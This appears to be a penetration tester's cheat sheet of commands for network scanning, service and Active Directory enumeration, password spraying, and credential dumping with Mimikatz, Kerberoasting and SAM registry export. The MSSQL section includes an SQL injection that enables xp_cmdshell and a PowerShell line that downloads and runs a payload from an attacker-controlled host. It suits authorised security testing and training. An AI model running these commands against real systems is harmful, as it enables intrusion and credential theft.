# Overview
Work in Progress

# Scanning and Enumeration
These are the NMAP scans that I typically always run for engagements. The `ping_scan.sh` is a script I use when I don't have access to NMAP in certain environments. I also run these scans multiple times throughout an engagement just in case some hosts were initially missed.

## NMAP Commands
### Discovery Scan
Comprehensive scan used to probe for online host. The results are saved into a file via the `-oA` flag. Can either scan a subnet:

```bash
sudo nmap -sn -PE -sP 10.11.1.5/24 -PU53,67-69,111,123,135,137-139,161-162,445,500,514,520,631,996-999,1434,1701,1900,3283,4500,5353,49152-49154 -PS3,7,9,13,17,19,21-23,25-26,37,53,79-82,88,100,106,110-111,113,119,135,139,143-144,179,199,254-255,280,311,389,427,443-445,464-465,497,513-515,543-544,548,554,587,593,625,631,636,646,787,808,873,902,990,993,995,1000,1022,1024-1033,1035-1041,1044,1048-1050,1053-1054,1056,1058-1059,1064-1066,1069,1071,1074,1080,1110,1234,1433,1494,1521,1720,1723,1755,1761,1801,1900,1935,1998,2000-2003,2005,2049,2103,2105,2107,2121,2161,2301,2383,2401,2601,2717,2869,2967,3000-3001,3128,3268,3306,3389,3689-3690,3703,3986,4000-4001,4045,4899,5000-5001,5003,5009,5050-5051,5060,5101,5120,5190,5357,5432,5555,5631,5666,5800,5900-5901,6000-6002,6004,6112,6646,6666,7000,7070,7937-7938,8000,8002,8008-8010,8031,8080-8081,8443,8888,9000-9001,9090,9100,9102,9999-10001,10010,32768,32771,49152-49157 -oA discovery
```

Or save IPs into a file and feed it to NMAP using the `-iL` flag:


```bash
sudo nmap -sn -PE -sP -iL scope.txt -PU53,67-69,111,123,135,137-139,161-162,445,500,514,520,631,996-999,1434,1701,1900,3283,4500,5353,49152-49154 -PS3,7,9,13,17,19,21-23,25-26,37,53,79-82,88,100,106,110-111,113,119,135,139,143-144,179,199,254-255,280,311,389,427,443-445,464-465,497,513-515,543-544,548,554,587,593,625,631,636,646,787,808,873,902,990,993,995,1000,1022,1024-1033,1035-1041,1044,1048-1050,1053-1054,1056,1058-1059,1064-1066,1069,1071,1074,1080,1110,1234,1433,1494,1521,1720,1723,1755,1761,1801,1900,1935,1998,2000-2003,2005,2049,2103,2105,2107,2121,2161,2301,2383,2401,2601,2717,2869,2967,3000-3001,3128,3268,3306,3389,3689-3690,3703,3986,4000-4001,4045,4899,5000-5001,5003,5009,5050-5051,5060,5101,5120,5190,5357,5432,5555,5631,5666,5800,5900-5901,6000-6002,6004,6112,6646,6666,7000,7070,7937-7938,8000,8002,8008-8010,8031,8080-8081,8443,8888,9000-9001,9090,9100,9102,9999-10001,10010,32768,32771,49152-49157 -oA discovery
```

Potential downsides depend on the environment. With all of these flags, it could cause unnecessary traffic, and scanning could take longer (especially when the scope is big). What I run instead when this happens is:

```bash
sudo nmap -sn -iL scope.txt --min-rate=150 -oA discovery
```

I removed the UDP and TCP port probes (-PU and -PS flags), which can slow down the scan.

### Grep Output
Take the discovered live hosts and save into a new text file:

```bash
cat discovery.gnmap | grep -i "up" | cut -d " " -f2 | grep -vi nmap > online_hosts
```

PowerShell version if you're testing in a Windows environment:

```PowerShell
Get-Content discovery.gnmap | Select-String -Pattern "up" -CaseSensitive:$false | ForEach-Object { $_.Line.Split()[1] } | Where-Object { $_ -notmatch "Nmap" } | Out-File -FilePath online_hosts
```

### Targeted Scan
Comprehensive targeted scan:

```Bash
sudo nmap --version-intensity=0 --min-rate=150 --max-retries=2 --initial-rtt-timeout=50ms --max-rtt-timeout=200ms --max-scan-delay=5 -Pn -sS -sV -sU -p T:1-65535,U:53,67-69,111,123,135,137-139,161-162,445,500,514,520,631,996-999,1434,1701,1900,3283,4500,5353,49152-49154 -iL online_hosts -oA targeted
```

# OSINT/Reconnaisance 

## BBOT
BBOT is one of my favorite tools for external network pentests. It's multipurpose and pretty comprehensive. When properly configured, you can uncover a wealth of information. Just be mindful that since the target is a domain, the tool may actively interact with hosts that are out of scope.

What you can do is eithe specify targets directly on the command line or load from a file (scope):

```bash
bbot -t targets.txt
```

This tool is a fast way to obtain subdomains. Which can be done either actively (I like to GoWitness module) or passively:

```bash
# Active
bbot -t tesla.com -f subdomain-enum  -m gowitness

# Passive
bbot -t tesla.com -f subdomain-enum -rf passive
```

I may some run something like:

```bash
bbot -t {scope.txt} -f subdomain-enum email-enum subdomain-hijack web-screenshots -m httpx badsecrets secretsdb affiliates -om json | jq | csv | human | txt
```

For better results (and best practice), tailor your flags and modules to your target.



# Service Enumeration

## HTTP(S)

Knowing what version of Apache running might give clues on what version of distro installed. Might be useful if you have a shell and want to run any kernel exploit.

```Bash
curl -v <IP>
```

Can also use NMAP, Burp Suite, or browser developer tools to analyze response headers for server version.

## Directory Discovery
For directory discovery, I typically like to use Burp Suite's Content Discovery tool because it is quieter than other directory discovery tools. However, not everyone has access to Burp Suite Pro.

## Gobuster

```Bash
gobuster dir -u <IP> -w /usr/share/wordlists/dirb/common.txt
```

## SMB

Always look through SYSVOL if you have READ access.


## Enumerate Hostname

Using Nmblookup:
```bash
$ nmblookup -A $ip
```

Using CrackMapExec (or Netexec)
```bash
crackmapexec smb <IP>
```

### List Shares

SMBMap Basic:

```bash
smbmap -H $IP
```

SMBMap with Null/Guest Sessions:
```bash

smbmap -u '' -p '' -H $Ip # similar to crackmapexec --shares
smbmap -u guest -p '' -H $IP
```

Using CrackMapExec:

```bash
crackmapexec smb <IP> --shares
```

Null Session:

```bash
crackmapexec smb <IP> -u '' -p '' --shares
```

Guest Session:

```bash
crackmapexec smb <IP> -u 'guest' -p '' --shares
```

Connect to SMB Share

**Basic Connection:**

```bash
smbclient //$IP/$SHARE
```

With Domain and User:

```bash
smbclient //$IP/$SHARE -U <DOMAIN.COM>/<USER> --password=<PASSWORD>
```

Using Hashes:

```bash
smbclient //$IP/$SHARE -U $USER --pw-nt-hash $HASH
```

### Recursively list directories and files

```bash
smbmap -R $SHARENAME -H $IP
```

### Download all Files (Skips the Y/N prompts)

```bash
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
```

## FTP

```bash
ftp <IP>
binary # Switches to binary transfer mode
ascii # Switch to ASCII transfer mode
ls # List files
get <filename> # Get file from the remote computer
put <filename> # Send one file
mget * # Download everything
```

- Always use **`binary`** mode for transferring binaries to avoid corruption.
- Always check for `anonymous` login

## MSSQL

### Connection

```bash
impacket-mssqlclient $USER:$PASSWORD@$iP -windows-auth
```

### Commands

```bash
SELECT @@version;
```

```bash
SELECT name FROM sys.databases;
```

```bash
SELECT name FROM sys.databases;
```

### Enabling xp_cmdshell from MSSQLCLIENT

**Configuration Commands:**

```bash
EXECUTE sp_configure 'show advanced options', 1;
```

```bash
RECONFIGURE;
```

```bash
EXECUTE sp_configure 'xp_cmdshell', 1;
```

```bash
RECONFIGURE;
```

```bash
EXECUTE xp_cmdshell 'whoami';
```

### SQLI to enable xp_cmdshell

```bash
1';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--
```

Ping from target machine to teset's machine $IP to see if xp_cmdshell was enabled successfully, check Wireshark or TCPDUMP for ICMP request.

```bash
'EXEC+xp_cmdshell+'ping+192.168.45.165';+--+
```

To download and execute payloads

```bash
'EXEC xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString('http://$IP/$PAYLOAD')";--
```

## MySQL

### **Always test root:root credential**

```bash
mysql --host=$IP -u root -p

mysql -h $IP -u wpmaster@localhost -p

mysql -h $IP -u root@localhost

mysql -h $IP -u ""@localhost
```

### Connection

```bash

mysql -h $IP -P 3306
mysql -u <user> -p <password>
mysql -u root -p
```

- MySQL often uses **`root`** as a default username with no password, especially on older installations.

## SSH

```bash
ssh $USER@$IP
```

```bash
ssh -i $KEY $USER@$IP
```

If you get this error `Permissions 0644 for '$KEY' are too open. It is required that your private key files are NOT accessible by others.` Fix it by changing the keys permissions to be only read-writable to you.

**Fix Permissions Error for SSH Key:**

```bash
chmod 600 $KEY
```

## RDP

### Connection

**Using rdesktop:**

```bash
rdesktop -d $DOMAIN -u $USER -p $PASSWORD $IP
```

**Using xfreerdp:**

```bash
xfreerdp /d:$DOMAIN /u:$USER /p:$PASSWORD /v:$IP
```

##  Exiftool
If you get some files from an FTP server or file share, use EXIFTOOL on the file to potentially get usernames from the Author metadeta.

```Bash
extiftool -xmp:author:all -a *
```

# Active Directory Enumeration 
## Using Command Prompt (CMD)

```bash
net user /domain
```

### **Enumerate Domain Groups**

```bash
net group /domain
```

### **Enumerate Group Members**

```bash
net group "GroupName" /domai
```

Replace **`"GroupName"`** with the actual group name.

### **View Domain Password Policy**

```bash
net accounts /domain
```

### **Enumerate Domain Controllers**

```bash
nltest /dclist:domainname
```

Replace **`domainname`** with the actual domain name.

## Using Native PowerShell (AD Module)

### **Enumerate Domain Users**

```powershell
Get-ADUser -Filter *
```

### **Enumerate Domain Groups**

```powershell
Get-ADGroup -Filter *
```

### **Enumerate Group Members**

```powershell
Get-ADGroupMember -Identity "GroupName"
```

Replace **`"GroupName"`** with the actual group name.

### **View Detailed User Information**

```powershell
Get-ADUser -Identity "username" -Properties *
```

Replace **`"username"`** with the actual username.

### **Enumerate Domain Controllers**

```powershell
Get-ADDomainController -Filter *
```

### **Enumerate Organizational Units (OUs)**

```powershell
Get-ADOrganizationalUnit -Filter * | Format-Table Name, DistinguishedName
```

### **Get Domain Policy**

```powershell
Get-ADDefaultDomainPasswordPolicy
```

### **Find Locked Out Accounts**

```powershell
Search-ADAccount -LockedOut
```

## Using PowerView

```PowerShell
PowerShell -ep bypass
```

```PowerShell
Import-Module .\PowerView.ps1
```

```PowerShell
Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
Get-NetDomain #basic information about the domain
Get-NetUser #list of all users in the domain
# The above command's outputs can be filtered using "select" command. For example, "Get-NetUser | select cn", here cn is sideheading for   the output of above command. we can select any number of them seperated by comma.
Get-NetGroup # enumerate domain groups
Get-NetGroup "group name" # information from specific group
Get-NetComputer # enumerate the computer objects in the domain
Find-LocalAdminAccess # scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
Convert-SidToName <sid/objsid> # converting SID/ObjSID to name 

# Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights 

Find-DomainShare #find the shares in the domain

Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts

Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
```


# CrackMapExec (or NetExec)

```Bash
crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  #Password spraying, viceversa can also be done
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares #lists all shares, provide creds if you have one
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --disks
crackmapexec smb <DC-IP> -u 'user' -p 'password' --users #we need to provide DC ip
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sessions #active logon sessions
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --pass-pol #dumps password policy
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sam #SAM hashes
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --lsa #dumping lsa secrets
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --ntds #dumps NTDS.dit file
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --groups {groupname} #we can also run with a specific group and enumerated users of that group.
crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command' #For executing commands, "-x" for cmd and "-X" for powershell command

#crackmapexec modules
crackmapexec smb -L #listing modules
crackmapexec smb -M mimikatx --options #shows the required options for the module
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz #runs default command
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' #runs specific command-M
```




# Credential Harvesting
## Mimikatz

```bash
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit" >> mimikatz.txt
```

Runs everything in one go and saves to a text file.

```bash
privilege::debug  #Check Architecture for for correct mimikatz version

#Password / Hash Grabbing Techniques
sekurlsa::logonpasswords  #Dump cached passwords from logins

lsadump::sam #Dumps passwords/hashes in sam file
lsadump::secrets #Dumps passwords

lsadump::dcsync /domain:corp.com /user:jeff_admin #Creates a ntlm hash from DC for lateral move

## Invoke-Mimikatz
Invoke-Mimikatz -DumpCreds -ComputerName COMP-123 

Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'

## Ticket Grabbing
net use \\dc01 #Creates a TGS with a domain user

sekurlsa::tickets  #Run with mimikatz
sekurlsa::tickets /export

PS C:\Users\Public\Documents> klist  #klist dumps tickets in powershell

#Invoke-Kerberoast.ps1 to dump tickets:

Import-Module .\Invoke-Kerberoast.ps1

Next type: PS C:\Users\Public> Invoke-Kerberoast.ps1

#Grabbing ticket hashes for hashcat:

Invoke-Kerberoast -OutputFormat Hashcat | % {$_.Hash} | Out-File -Encoding ascii hashes.hashcat

hashcat -m 13100 -a 0 -o cracked.txt hashes.hashcat /home/kali/rockyou.txt  ##Use SMBserver to transfer hashes

# Grabbing tickets for john:

PS C:\Tools\active_directory> Invoke-Kerberoast -

OutputFormat john | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')}

sudo john --format=krb5tgs hash.txt --wordlist=/home/kali/rockyou.txt  #Use SMBserver to transfer hashes
```

## SAM

```bash
# Loot passwords without tools
reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system
```

# BloodHound Custom Cypher Queries
